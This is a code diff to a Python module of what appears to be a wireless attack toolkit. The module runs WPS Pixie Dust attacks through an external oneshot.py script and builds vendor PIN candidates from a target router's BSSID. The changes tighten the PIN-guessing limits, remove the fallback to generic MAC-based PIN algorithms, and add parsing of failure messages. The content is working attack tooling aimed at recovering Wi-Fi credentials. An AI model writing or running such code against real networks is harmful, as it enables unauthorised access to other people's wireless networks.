@@ -17,8 +17,9 @@ from attack import tools
 from attack.model import AttackEvent, EventType
 
 ONESHOT_PY = os.path.join(config.PROJECT_DIR, "tools", "oneshot", "oneshot.py")
-VENDOR_MAX = 8
-VENDOR_TRY_SEC = 25
+VENDOR_MAX = 3
+VENDOR_TRY_SEC = 10
+ONESHOT_MAX_SEC = 25
 
 _PIN_RE = re.compile(
     r"(?:WPS PIN|PIN(?:\s+is)?|Pin is)\s*[:=]?\s*'?([0-9]{4,8}|)'?",
@@ -53,7 +54,7 @@ def _load_wpspin():
 
 
 def vendor_candidates(bssid, limit=VENDOR_MAX):
-    """Suggested then fill with MAC algos; dedupe; cap at limit."""
+    """OUI-matched suggested PINs only — never grind generic MAC algos."""
     gen = _load_wpspin()
     if not gen:
         return []
@@ -68,26 +69,13 @@ def vendor_candidates(bssid, limit=VENDOR_MAX):
         if pin is None:
             continue
         pin = str(pin)
-        if pin in seen:
+        if pin == "" or pin in seen:
             continue
         seen.add(pin)
         out.append({"algo": item.get("id") or "suggest", "pin": pin})
         if len(out) >= limit:
-            return out
-    # Fill with core MAC algos if suggestions empty / short
-    for algo in ("pinEmpty", "pin24", "pinDLink", "pinASUS", "pin28",
-                 "pin32", "pinAirocon", "pinBrcm1"):
-        if len(out) >= limit:
             break
-        try:
-            pin = str(gen.generate(algo, bssid))
-        except Exception:  # noqa: BLE001
-            continue
-        if pin in seen:
-            continue
-        seen.add(pin)
-        out.append({"algo": algo, "pin": pin})
-    return out[:limit]
+    return out
 
 
 def _parse_creds(text):
@@ -162,6 +150,10 @@ def run_pixie(iface, target, emit, stop_flag, timeout=60):
             if pin is not None and re.search(
                     r"WPA PSK|PSk|passphrase|connected", line, re.I):
                 pass
+            if re.search(r"No suitable network found|Unable to connect|"
+                         r"Network not found", line, re.I):
+                reason = "no ap"
+                break
             if re.search(r"WPS pin not found|Pixie.?Dust.*fail|"
                          r"offline attack failed", line, re.I):
                 reason = "pixie fail"
